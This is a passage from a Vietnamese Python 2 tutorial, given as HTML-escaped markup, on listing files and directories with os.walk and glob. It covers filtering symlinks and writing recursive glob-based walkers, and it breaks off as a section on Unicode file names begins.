&lt;p&gt;Dưới đây là hàm sử dụng &lt;tt class="docutils literal"&gt;walk&lt;/tt&gt; để liệt kê tất cả các file và thư mục con trong một thư mục cho trước, kết quả trả về chứa đường dẫn đầy đủ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="n"&gt;FJoin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;GetFiles&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Output: file_list là danh sách tất cả các file trong path và trong tất cả các&lt;/span&gt;
&lt;span class="sd"&gt;       thư mục con bên trong nó. dir_list là danh sách tất cả các thư mục con&lt;/span&gt;
&lt;span class="sd"&gt;       của nó. Các output đều chứa đường dẫn đầy đủ.&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="n"&gt;file_list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dir_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[],&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;subdirs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;walk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;file_list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;FJoin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
        &lt;span class="n"&gt;dir_list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;FJoin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;subdirs&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;file_list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dir_list&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dirs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;GetFiles&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expanduser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;~/Music&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;file&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nb"&gt;file&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;dir&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;dirs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nb"&gt;dir&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hàm này chạy tốt trên Windows, trên Linux nó lấy cả các link. Nói chung các link sẽ không có ý nghĩa trong đa số các trường hợp của bạn. Để loại bỏ các link bạn viêt lại hàm &lt;tt class="docutils literal"&gt;GetFiles&lt;/tt&gt; như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;GetFiles&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;file_list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dir_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[],&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;subdirs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;walk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;file_list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;FJoin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
        &lt;span class="n"&gt;dir_list&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;FJoin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;subdirs&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;file_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;islink&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;file_list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;dir_list&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;islink&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;dir_list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;file_list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dir_list&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Chú ý rằng một object vừa có thể là file vừa có thể là link. Vì vậy bạn không thể dùng hàm &lt;tt class="docutils literal"&gt;os.path.isfile&lt;/tt&gt; để lọc các link được:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;islink&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/home/hoaiptm/Music/mylink&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/home/hoaiptm/Music/mylink&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Tương tự như vậy với hàm &lt;tt class="docutils literal"&gt;os.path.isdir&lt;/tt&gt;, nó cũng trả về &lt;tt class="docutils literal"&gt;True&lt;/tt&gt; nếu object là link liên kết đến một thư mục khác.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="su-dung-glob"&gt;
&lt;h2&gt;3. Sử dụng &lt;tt class="docutils literal"&gt;glob&lt;/tt&gt;&lt;/h2&gt;
&lt;p&gt;&lt;tt class="docutils literal"&gt;glob&lt;/tt&gt; là cách liệt kê file và thư mục theo pattern, các pattern có thể chứa các ký tự đại diện như &lt;tt class="docutils literal"&gt;*&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;?&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;[]&lt;/tt&gt;, nó cho phép bạn tìm kiếm chỉ các file có tên thỏa mãn quy tắc pattern cho trước. Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# liệt kê các file và thư mục trong thư mục path&lt;/span&gt;
&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# liệt kê các file và thư mục cấp 2 bên trong thư mục path.&lt;/span&gt;
&lt;span class="c1"&gt;# chẳng hạn path chứa thư mục A, B, C thì lệnh trên sẽ&lt;/span&gt;
&lt;span class="c1"&gt;# liệt kê hết các file và thư mục bên trong A, B, C.&lt;/span&gt;
&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# liệt kê các file và thư mục trong thư mục path bắt đầu với chữ cái a.&lt;/span&gt;
&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[a]*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# liệt kê các file và thư mục trong thư mục path&lt;/span&gt;
&lt;span class="c1"&gt;# có tên kết thúc bằng chữ cái p và có đúng 3 ký tự.&lt;/span&gt;
&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;??p&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Chú ý rằng không giống như &lt;tt class="docutils literal"&gt;listdir&lt;/tt&gt; hoặc &lt;tt class="docutils literal"&gt;walk&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;glob&lt;/tt&gt; lấy đường dẫn đầy đủ.&lt;/p&gt;
&lt;p&gt;Hàm &lt;tt class="docutils literal"&gt;glob&lt;/tt&gt; không thực hiện đệ quy. Hàm sau đây sử dụng &lt;tt class="docutils literal"&gt;glob&lt;/tt&gt; để tìm kiếm đệ quy tất cả các file và thư mục bên trong thư mục cho trước:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;glob&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;dirwalk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;bag&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;wildcards&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;bag&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;wildcards&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;fullpath&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isdir&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fullpath&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;islink&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fullpath&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;dirwalk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fullpath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;bag&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;wildcards&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;files&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

&lt;span class="c1"&gt;# Lấy tất cả các file và thư mục con trong thư mục path:&lt;/span&gt;
&lt;span class="n"&gt;dirwalk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Lấy tất cả các file trong thư mục path (có thể có lẫn thư mục):&lt;/span&gt;
&lt;span class="n"&gt;dirwalk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;*.*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Lấy tất cả các file python trong thư mục path:&lt;/span&gt;
&lt;span class="n"&gt;dirwalk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;*.py&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Lấy tất cả các file hoặc thư mục bắt đầu bằng &amp;quot;py&amp;quot; trong thư mục path:&lt;/span&gt;
&lt;span class="n"&gt;dirwalk&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;files&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;py*.*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hàm &lt;tt class="docutils literal"&gt;dirwalk&lt;/tt&gt; ở triển khai này làm được nhiều việc hơn hàm GetFiles triển khai ở mục 2. Nó tổng quát hơn.&lt;/p&gt;
&lt;p&gt;Một cách triển khai khác có thể viết như thế này:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;dirwalk2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;bag&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;wildcards&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; bag là một list chứa các file thỏa mãn quy tắc wildcards &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
        &lt;span class="n"&gt;bag&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;glob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;wildcards&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
        &lt;span class="n"&gt;dirwalk2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;bag&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;wildcards&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;tt class="docutils literal"&gt;dirwalk2&lt;/tt&gt; tuy ngắn gọn nhưng khó hiểu hơn &lt;tt class="docutils literal"&gt;dirwalk&lt;/tt&gt;. Nó hoàn toàn tương tự ngoại trừ việc không kiểm tra một object có thể là link (chỉ có ý nghĩa trên linux).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="thu-muc-co-chua-ten-file-tieng-viet"&gt;
&lt;h2&gt;4. Thư mục có chứa tên file tiếng Việt&lt;/h2&gt;
&lt;p&gt;Các ví dụ phía trên giả thiết rằng bạn có các tên file và thư mục là tiếng anh thông thường hoặc tiếng việt không dấu. Thư mục có thể chứa các file có tên tiếng việt hoặc tiếng Tàu, tiếng Hàn... Bạn phải truyền đối số unicode cho các hàm &lt;tt class="docutils literal"&gt;listdir&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;walk&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;glob&lt;/tt&gt;... Quy tắc này áp dụng cho tất cả các hàm và thủ tục khác thao tác với file. Quan sát ví dụ sau (trên Windows):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;FJoin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;
